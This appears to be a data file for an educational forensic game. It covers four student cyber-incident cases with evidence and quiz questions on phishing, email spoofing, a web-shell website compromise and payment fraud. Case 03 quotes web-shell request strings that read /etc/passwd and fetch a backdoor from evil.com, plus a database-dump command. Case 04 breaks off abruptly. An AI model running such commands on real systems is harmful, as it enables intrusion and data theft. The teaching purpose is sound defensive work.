case-01.name: CASE 01 — STOLEN SOCIAL MEDIA ACCOUNT
case-01.summary: A student's social media account has been taken over. Find how the attacker gained access.

evidence.title: GEOLOCATION MISMATCH
evidence.details: Account login recorded from IP 194.26.29.112 (Frankfurt, Germany) using Linux/Chrome. The account owner was asleep in Chennai, India.

evidence.title: PASSWORD & RECOVERY CHANGE
evidence.details: Account password changed. Recovery email updated from student@college.edu to shadow_relay_99@proton.me. 2FA was not enabled.

evidence.title: SUSPICIOUS BADGE VERIFICATION DM
evidence.details: Victim received a message from '@Instagram_Verify_Help' stating: 'Your badge is ready. Click http://insta-badge-claim.xyz to secure your account within 24 hours.'

evidence.title: CREDENTIAL FORM ENTRY
evidence.details: Victim visited 'insta-badge-claim.xyz' and entered existing username and current password on an unverified web form.

round2Evidence.title: SESSION COOKIE EXFILTRATION
round2Evidence.details: Web server logs demonstrate session cookie dumping. Cookie flag 'HttpOnly' was absent, allowing malicious client-side JavaScript from 'insta-badge-claim.xyz' to exfiltrate active session tokens.

round2Evidence.title: BULLETPROOF HOSTING ASN TRACE
round2Evidence.details: Reverse DNS query reveals 'insta-badge-claim.xyz' resolves to IP 194.26.29.112 assigned to a bulletproof hosting provider registered in Victoria, Seychelles with known C2 infrastructure.

round2Evidence.title: PERSISTENCE VIA THIRD-PARTY APP
round2Evidence.details: Attacker granted full API permissions to rogue application 'AnalyticsBoost_v2', enabling permanent read/write access to student DMs and contacts even after standard password change.

round2Evidence.title: PASSWORD REUSE CORRELATION
round2Evidence.details: Credential analysis shows the student used the identical password across their campus student portal, personal email, and social media, creating an immediate cross-account compromise risk.

questions.explanation: The access log clearly states the login IP 194.26.29.112 was located in Frankfurt, Germany.

questions.explanation: The evidence record states the student was asleep in Chennai, India.

questions.explanation: The DM explicitly urged the user to visit 'http://insta-badge-claim.xyz'.

questions.explanation: The browser history evidence shows the student entered their username and current password.

questions.text: What critical security feature was NOT enabled on the student's social account?
questions.explanation: The security event log notes: '2FA was not enabled'.

questions.text: What username sent the fake badge verification direct message?
questions.explanation: The DM log shows the sender handle was '@Instagram_Verify_Help'.

questions.text: How much time did the fake message claim the user had to claim their badge?
questions.explanation: The message stated: 'Click http://insta-badge-claim.xyz to secure your account within 24 hours.'

questions.text: Which operating system was recorded in the Frankfurt login access log?
questions.explanation: The access log specifies the user agent as Linux/Chrome.

questions.text: What was the student's original legitimate recovery email before it was modified?
questions.explanation: The security log notes recovery email updated from student@college.edu.

questions.text: Which browser was reported in the Frankfurt unauthorized login?
questions.explanation: The access log specifies Linux/Chrome.

questions.text: What kind of lure did the scammer use to trick the student into opening the link?
questions.explanation: The scammer promised an Instagram verification badge.

questions.text: What protocol was used in the scam link 'http://insta-badge-claim.xyz'?
questions.explanation: The URL begins with http://, indicating plain unencrypted HTTP.

questions.text: Why was the 24-hour deadline in the message a major red flag?
options: Verification badges are deleted every 24 hours by default
Social platforms only send notifications on weekends
It created false urgency to stop the victim from thinking critically
Official badges always take at least 6 months to expire
questions.explanation: Artificial urgency (24-hour pressure) is a classic social engineering psychological tactic.

questions.text: Even before looking at IP logs, what detail in the URL alone proves it is not Instagram?
options: It has more than three letters in the path
The domain name is 'insta-badge-claim.xyz' instead of 'instagram.com'
It was opened through a mobile browser
It was typed in lowercase letters
questions.explanation: Official Instagram services operate strictly on instagram.com, not third-party .xyz domains.

round2Questions.text: What missing cookie security flag allowed client-side scripts to steal the session token?
round2Questions.explanation: The forensic log explicitly highlights: 'Cookie flag HttpOnly was absent, allowing malicious client-side JavaScript to exfiltrate session tokens.'

round2Questions.text: To which geographic jurisdiction was the bulletproof hosting provider registered?
round2Questions.explanation: The DNS / WHOIS trace details registration in Victoria, Seychelles.

round2Questions.text: What rogue application did the attacker authorize to maintain persistence after password change?
round2Questions.explanation: The OAuth permission log identified 'AnalyticsBoost_v2' granted full API access.

round2Questions.text: Why would changing the social media password alone NOT remove the attacker's access?
options: Passwords are only updated on servers once per week
The student's Wi-Fi router was infected with firmware malware
The attacker still owned the victim's physical smartphone
The rogue third-party OAuth app retained persistent API read/write tokens
round2Questions.explanation: Third-party OAuth permissions remain valid independently of password resets until explicitly revoked.

round2Questions.text: What major risk was identified during the student's credential audit?
options: Using a password that contained more than 16 characters
Storing passwords in an encrypted password manager
Reusing the identical password across college portal, email, and social media
Changing passwords on a monthly basis
round2Questions.explanation: The audit revealed password reuse across campus portal, email, and social media.

round2Questions.text: How did the attacker gain knowledge of the student's password in the first place?
options: By guessing the student's pet name
The student voluntarily submitted it on the phishing web form
By brute-forcing 10 million combinations over 3 days
round2Questions.explanation: Browser history confirmed the victim typed their username and current password on the fake site.

round2Questions.text: What is the primary operational purpose of a 'bulletproof host' for cybercriminals?
options: To ignore law enforcement take-down requests and abuse notices
To offer free cloud backups for university students
To provide faster internet speeds for gamers
round2Questions.explanation: Bulletproof hosts deliberately refuse abuse complaints and resist subpoenas to protect illegal operations.

round2Questions.text: Why did the attacker change the account recovery email immediately upon gaining access?
options: To reduce spam in the student's inbox
To test if ProtonMail servers were active
To share photos with other classmates
To prevent the legitimate owner from triggering a password reset recovery
round2Questions.explanation: Overwriting recovery email locks out the victim and routes recovery links exclusively to the attacker.

round2Questions.text: If 2FA had been enabled using an Authenticator App, how would it have affected the attacker at 03:15 UTC?
options: The student's phone would automatically power off
The password would be deleted from Instagram servers
The login would be blocked because the attacker lacked the time-based OTP code
The login would succeed because the attacker had the password
round2Questions.explanation: Time-based one-time passwords (TOTP) require physical device possession, blocking remote logins even with valid passwords.

round2Questions.text: What correlation exists between the IP in the access log and the domain resolution in Round 2?
options: The access log IP was in India while the domain IP was in Japan
Both point to IP 194.26.29.112, connecting the phishing site to the Frankfurt login
One is an IPv4 address while the other is an IPv6 address
There is no correlation between the two records
round2Questions.explanation: Both the access log and the reverse DNS for insta-badge-claim.xyz point to 194.26.29.112.

round2Questions.text: Why is the use of ProtonMail by the attacker significant in this investigation?
options: It provides end-to-end encryption and does not easily reveal user identity logs
It only functions on Linux computers
It automatically deletes sent emails after 10 seconds
It is the official email service used by university staff
round2Questions.explanation: ProtonMail is privacy-centric, making anonymous adversary attribution more difficult without lawful court orders.

round2Questions.text: What step must the student take FIRST to prevent cross-account compromise?
options: Delete all photos from their phone gallery
Turn off their Wi-Fi router for 48 hours
Immediately change passwords on their campus portal and personal email
round2Questions.explanation: Because the same password was reused, campus and email accounts are vulnerable and require instant password resets.

round2Questions.text: What does the 'HttpOnly' flag protect against when properly configured on session cookies?
options: It encrypts the entire hard drive of the user's computer
It blocks users from clicking hyperlinks
It prevents client-side JavaScript from accessing 'document.cookie' during XSS attacks
It forces all website images to load over HTTPS
round2Questions.explanation: HttpOnly prevents browser scripts from reading sensitive session cookies, mitigating token theft via XSS.

round2Questions.text: Reconstructing the timeline, which event occurred FIRST in the attacker's chain of compromise?
options: Sending the social engineering DM with the phishing link
Changing the recovery email to ProtonMail
round2Questions.explanation: The DM was sent 'Yesterday 18:40 UTC', luring the victim to submit credentials hours before the 03:15 UTC login.

round2Questions.text: What is the complete remediation checklist required to fully recover and secure this account?
options: Reset password, restore recovery email, revoke OAuth app permissions, and enable 2FA
Restart the computer and clear the browser cache once
Simply change the password and leave all other settings unchanged
Report the account as deleted and register a brand new account
round2Questions.explanation: Comprehensive recovery requires resetting credentials, fixing recovery channels, revoking rogue OAuth apps, and turning on 2FA.

case-02.name: CASE 02 — PHISHING EMAIL ATTACK
case-02.summary: A student receives a suspicious email asking for login details. Identify the clues that reveal the phishing attempt.

evidence.title: SPOOFED SENDER ADDRESS
evidence.details: Display name: 'College Admin Portal'. Actual sender header: 'service-notice@tjs-college-verify.co.vu'. The official college domain is 'tjs.edu.in'.

evidence.title: URGENT THREAT NOTICE
evidence.details: 'URGENT: Your student portal access will be permanently terminated in 3 hours unless you confirm your password immediately.'

evidence.title: MISMATCHED DESTINATION URL
evidence.details: Button text: 'Verify Student Portal'. Hyperlink target: 'http://172.67.182.20/portal-login/index.php'. Notice the non-HTTPS plain IP address.

evidence.title: ATTACHED HTML FILE
evidence.details: File attached: 'Account_Verification_Form.html'. Contains obfuscated JavaScript designed to transmit submitted form data to an external server.

round2Evidence.title: SPF, DKIM & DMARC MISALIGNMENT
round2Evidence.details: Header analysis reveals 'Received-SPF: softfail (~all)', 'DKIM-Signature: d=spoof-mailer.biz (fail)', and 'DMARC: p=quarantine'. The visible sender claimed to be 'admin@college.edu'.

round2Evidence.title: OPEN RELAY HOP DISCOVERY
round2Evidence.details: Hop tracking demonstrates the email originated from an insecure open SMTP relay at IP 200.147.35.12 located in Brazil, bypassing college campus mail submission filters.

round2Evidence.title: OBFUSCATED HTML SMUGGLING
round2Evidence.details: Attachment 'Fee_Statement_2026.html' contains an embedded Base64-encoded JavaScript blob utilizing 'unescape()' and Blob URL generation to reconstruct a credential harvester offline.

round2Evidence.title: LOOKALIKE HOMOGLYPH DOMAIN
round2Evidence.details: Target URL embedded in the HTML file resolves to 'cоllege.edu' utilizing Cyrillic small letter 'о' (U+043E), creating a visually indistinguishable homoglyph domain.

options: Obfuscated JavaScript to steal submitted form data
An audio recording of a lecture

options: All numbers in URLs are automatically blocked by the government

questions.explanation: Legitimate institutional portals rely on registered domains with SSL certificates, not raw IP destinations.

questions.explanation: The domain used was 'tjs-college-verify.co.vu'.

questions.text: What action should a student take upon receiving an email asking for passwords?
options: Forward the email to all friends asking them to verify
Immediately reply with their password to be safe
Never enter passwords; report the email to the college IT department
Click the link on three different devices
questions.explanation: Legitimate administrators never ask for passwords via email; reporting to IT is the correct protocol.

questions.text: Why do phishing emails often attach an HTML file instead of hosting a web link?
options: Because HTML files can only be opened on supercomputers
To evade network web filters and run the malicious form locally in the victim's browser
Because attachments guarantee the email is free of viruses
To save storage space on the college mail server
questions.explanation: Local HTML forms bypass perimeter web URL blockers until form submission occurs.

questions.text: What is the primary indicator that 'College Admin Portal' is not the true sender?
options: The underlying email address header does not match the official college domain
The email was sent to multiple recipients
The email had a subject line in English
The email was received during morning hours
questions.explanation: Display names can be set arbitrarily; the actual sender header exposes the true originating domain.

round2Questions.text: What did the SPF authentication check return in the email header analysis?
round2Questions.explanation: The header explicitly noted: 'Received-SPF: softfail (~all)'.

round2Questions.text: In which country was the insecure open SMTP relay located?
round2Questions.explanation: The hop tracking identified IP 200.147.35.12 located in Brazil.

round2Questions.text: What technique was used in 'Fee_Statement_2026.html' to construct the harvester offline?
options: HTML Smuggling via Base64 blob decoding
round2Questions.explanation: Evidence 3 details 'Obfuscated HTML Smuggling' utilizing Base64 and Blob URL generation.

round2Questions.text: What specific Unicode character trick was employed in the lookalike homoglyph domain?
round2Questions.explanation: The DNS evidence specifies Cyrillic small letter 'о' (U+043E) forming 'cоllege.edu'.

round2Questions.text: What DMARC policy was published by the victim domain according to the header?
round2Questions.explanation: The header states: 'DMARC: p=quarantine'.

round2Questions.text: Why did the attacker route the email through an open SMTP relay in Brazil?
options: To obscure the real sender IP and bypass reputation filters
Because college emails can only be sent from South America
Because Brazilian servers have lower electricity costs
To translate the email into Portuguese
round2Questions.explanation: Open relays allow unauthorized third parties to route spoofed emails, hiding the actual origin.

round2Questions.text: What is the primary danger of homoglyph domain attacks (IDN homograph attacks)?
options: They crash the user's internet modem instantly
They prevent search engines from working
They only work on mobile phones
They look visually identical to trusted domain names in modern browser address bars
round2Questions.explanation: Homoglyphs use different Unicode scripts that render identically, deceiving even observant users.

round2Questions.text: What function does HTML smuggling serve in bypassing corporate email security gateways?
options: It encrypts the entire email gateway hard disk
It physically unplugs the gateway firewall
The payload is generated dynamically inside the browser, avoiding static gateway signatures
It transforms the email into a PDF document
round2Questions.explanation: Gateways cannot easily inspect files that do not exist until assembled by client-side browser JavaScript.

round2Questions.text: Why did DKIM verification fail with 'd=spoof-mailer.biz'?
options: The college mail server was powered off
The cryptographic signature domain did not match the claimed sender domain
The student had not installed the DKIM software on their laptop
The email was sent without any text in the body
round2Questions.explanation: DKIM signs emails cryptographically; a signature from spoof-mailer.biz fails alignment for college.edu.

round2Questions.text: If the college DMARC policy had been set to 'p=reject' instead of 'p=quarantine', what would have happened?
options: The receiving mail server would outright drop the email, preventing delivery to the student
The email would still be delivered straight to the Primary Inbox
All college email accounts would be suspended
The attacker would receive an automated apology email
round2Questions.explanation: 'p=reject' instructs receiving servers to completely reject unaligned spoofed messages.

round2Questions.text: What is the role of the Base64 encoding used inside the attached HTML file?
options: To compress the file size so it fits on a floppy disk
To speed up the student's internet connection
To make the web page display in colorful fonts
To hide malicious code from simple text-matching antivirus scanners
round2Questions.explanation: Adversaries encode JavaScript payloads in Base64 to conceal explicit malicious keywords from string inspection.

round2Questions.text: Which email authentication record is explicitly published in the domain DNS to list authorized sending IPs?
round2Questions.explanation: SPF TXT records list the specific IP addresses authorized to send emails on behalf of that domain.

round2Questions.text: How can an email client or browser protect users against homoglyph attacks?
options: By blocking all websites registered on Tuesdays
By displaying internationalized domains in Punycode format (e.g., 'xn--...')
By converting all incoming emails to black-and-white text
round2Questions.explanation: Displaying Punycode makes spoofed internationalized domain labels visibly distinct from Latin characters.

round2Questions.text: Analyzing the combined email headers, what three authentication failures definitively prove email spoofing?
options: SPF softfail, DKIM domain mismatch (spoof-mailer.biz), and DMARC alignment failure
Missing subject line, missing date, and missing attachment
Plain text encoding, English language, and standard font size
Sender used Gmail, receiver used Outlook, and delivery took 2 seconds
round2Questions.explanation: The failure of SPF, DKIM alignment, and DMARC together proves sender spoofing beyond doubt.

round2Questions.text: What is the most effective architectural defense for the college IT team to prevent future spoofing of their domain?
options: Block all emails containing the word 'urgent'
Change the college website background color to red
Ask all students to stop reading emails on mobile devices
Enforce strict DMARC 'p=reject' policy with 100% DKIM and SPF alignment
round2Questions.explanation: Publishing DMARC with 'p=reject' guarantees unauthorized mail servers cannot deliver spoofed emails.

case-03.name: CASE 03 — HACKED COLLEGE WEBSITE
case-03.summary: The college website has been changed without permission. Investigate the evidence to understand how access was gained.

evidence.title: HOME PAGE DEFACED
evidence.details: Homepage 'index.html' replaced with banner: 'HACKED BY GHOST_SEC'. News feed articles deleted.

evidence.title: CMS ADMIN PORTAL BRUTE FORCE
evidence.details: Over 4,500 POST requests to '/admin/login.php' from IP 45.142.122.9 in 10 minutes. Final request returned HTTP 200 (Success) for username 'admin'.

evidence.title: DEFAULT CREDENTIALS FOUND
evidence.details: Web CMS administrator account had password set to 'admin123'. Account had not enforced rate limiting or account lockout.

evidence.title: WEB SHELL UPLOAD
evidence.details: File 'gallery_photo.php' uploaded via the unauthenticated image upload endpoint in the student gallery plugin.

round2Evidence.title: WEB SHELL COMMAND EXECUTION
round2Evidence.details: HTTP GET requests to '/uploads/gallery_photo.php?cmd=whoami' returned 'www-data'. Followed by '?cmd=cat%20/etc/passwd' and '?cmd=wget%20http://evil.com/backdoor.sh'.

round2Evidence.title: HTACCESS REDIRECTION TAMPER
round2Evidence.details: .htaccess file overwritten with RewriteRule redirecting all incoming student traffic on mobile devices to a fraudulent ad-revenue network.

round2Evidence.title: MYSQL DUMP EXFILTRATION
round2Evidence.details: Execution of 'mysqldump -u root -p college_portal > /var/www/html/backup.sql' followed by outbound HTTP download to adversary IP 45.142.122.9.

round2Evidence.title: OVERLY PERMISSIVE DIRECTORY
round2Evidence.details: Directory '/var/www/html/uploads' had full 777 read-write-execute permissions and lacked PHP execution restrictions in Apache virtual host configuration.

questions.text: What should the system administrator change immediately after regaining control?
options: The default administrator password to a strong, unique password
questions.explanation: Changing default credentials to a strong password is the most urgent remediation step.

options: The backend code lacked file extension and MIME type validation
The website was hosted on a Linux computer
The server ran out of hard disk memory
The PHP file was smaller than 10 kilobytes
questions.explanation: Without server-side extension whitelisting, arbitrary scripts can be uploaded disguised as images.

questions.text: What distinguishes website defacement from a purely silent data theft attack?
options: Defacement always destroys the physical server hardware
Defacement only affects web browsers on Apple devices
Defacement requires physical access to the college server room
Defacement is intentionally public and visible to cause reputational damage
questions.explanation: Defacement prioritizes visible vandalism and public notoriety over clandestine data gathering.

round2Questions.text: What is the primary risk of running the web server process as 'www-data' without chroot or container isolation?
options: A web shell can read sensitive files accessible to web group and explore system utilities
The website cannot connect to the internet
The entire computer will shut down automatically
Only administrators can visit the website
round2Questions.explanation: An unconfined process lets web shells execute system binaries like cat, wget, and mysqldump.

round2Questions.text: Why is an account lockout policy of 5 failed attempts crucial against brute force attacks?
options: It automatically emails the attacker's home address to police
It saves battery power on the user's laptop
It makes the website load faster for legitimate visitors
It stops automated tools from testing thousands of passwords per minute
round2Questions.explanation: Lockouts render high-speed dictionary guessing ineffective by freezing authentication.

round2Questions.text: How did the attacker pivot from application-level access to system-level command execution?
options: By sending an email to the college principal
By clicking the Refresh button on the defaced homepage
By uploading and invoking a PHP web shell containing system execution functions like 'shell_exec()'
By connecting an external USB drive to the server
round2Questions.explanation: PHP functions such as shell_exec() or system() bridge web requests into operating system commands.

round2Questions.text: What file integrity monitoring (FIM) tool alert would have immediately caught the homepage alteration?
options: A warning that RAM usage is below 10%
An alert detecting an unauthorized hash change on 'index.html' and '.htaccess'
A notification about a full printer queue
round2Questions.explanation: File Integrity Monitoring alerts whenever core system files differ from their approved checksums.

round2Questions.text: Why should database credentials never be stored in plaintext inside web application configuration files?
options: Any web shell that reads web application files can immediately compromise the backend database
Plaintext files cannot be opened on Linux systems
Database passwords only work when stored in audio format
Plaintext files take twice as long for computers to read
round2Questions.explanation: Web shell access allows adversaries to read config files and obtain full database master passwords.

round2Questions.text: Reconstructing the attacker's kill chain, what is the exact chronological order of exploitation?
options: Dump DB -> Overwrite homepage -> Brute force admin portal -> Upload web shell
Overwrite homepage -> Dump DB -> Upload web shell -> Brute force admin portal
Execute commands -> Overwrite .htaccess -> Brute force admin portal -> Upload web shell
Brute force admin portal -> Upload web shell -> Execute commands & dump DB -> Overwrite homepage & .htaccess
round2Questions.explanation: Timestamps prove: brute force at 01:55, shell upload at 02:02, commands/dump at 02:04-02:06, defacement at 02:10.

round2Questions.text: What is the complete defense-in-depth strategy to permanently secure this web application?
options: Restarting the Apache server every 4 hours
Deleting all images from the gallery plugin
Strict input/upload validation, directory execution disablement, MFA on admin login, and database isolation
Only changing the homepage background image
round2Questions.explanation: Defense-in-depth requires hardening authentication, restricting file uploads, isolating storage, and sandboxing processes.

case-04.name: CASE 04 — FAKE ONLINE PAYMENT
case-04.summary: A student loses money after a suspicious online transaction. Trace the evidence and identify the fraud.

evidence.title: UNAUTHORIZED UPI TRANSFER

Social platforms do not support video ads
Hijacked ad accounts can only run ads for laptops
round2Questions.explanation: Aged, compromised corporate ad accounts bypass security filters and burn through credit before owners notice.

round2Questions.text: How do cybercrime investigators correlate disparate scam campaigns to a single syndicate?
options: By measuring the size of the product photographs
By checking if the website font is Arial or Times New Roman
By looking at the color of the website buttons
By cross-referencing shared VPAs, IFSC bank codes, registrar email addresses, and server hosting subnets
round2Questions.explanation: Shared payment handles, bank account clusters, WHOIS registrants, and C2 IPs connect serial campaigns.

round2Questions.text: What is the role of an ATM CCTV footage audit in unmasking money mule cash-out networks?
options: It tests the clarity of ATM glass doors
It checks if the ATM keypad needs cleaning
It captures timestamped physical facial imagery and vehicle details of the runner withdrawing cash
It calculates how many bank customers visit each day
round2Questions.explanation: CCTV logs tied to transaction timestamps provide physical visual identification of cash-out runners.

round2Questions.text: What consumer protection regulation in India requires e-commerce entities to display nodal grievance officers?
round2Questions.explanation: The E-Commerce Rules (2020) mandate publishing registered business details, addresses, and grievance officers.

round2Questions.text: How can prospective buyers verify whether an e-commerce website was registered only 5 days ago?
options: By checking domain creation dates on ICANN WHOIS lookup portals
By converting the webpage to a PDF
By checking the battery percentage on their smartphone
round2Questions.explanation: ICANN WHOIS lookup displays exact domain creation dates, revealing disposable 5-day-old storefronts.

round2Questions.text: Reconstructing the syndicated shopping fraud operation, what were the four key components of the criminal enterprise?
options: Social engineering phone call -> Desktop virus -> Hardware repair -> Invoice billing
Physical retail store -> TV advertising -> Post office delivery -> Government bank wire
Local Wi-Fi snooping -> Ransomware encryption -> Bitcoin ransom -> Decryption key
Hacked ad accounts for reach -> Disposable 5-day lookalike storefront -> Synthetic tracking page -> Stolen-KYC mule bank accounts with rapid ATM cash-out
round2Questions.explanation: The enterprise synthesized ad hijacking, disposable storefronts, synthetic tracking, and rural mule cash-out infrastructure.

round2Questions.text: What multi-agency coordination strategy is required to dismantle this 48-campaign fraud network?
options: Banning all online shopping in the country
Asking students to avoid using the internet
Inter-state cyber police coordination, nodal bank account freezing, registrar domain takedowns, and social platform ad-fraud reporting
round2Questions.explanation: Dismantling serial syndicates requires law enforcement coordination, bank nodal freezes, domain takedowns, and ad platform remediation.
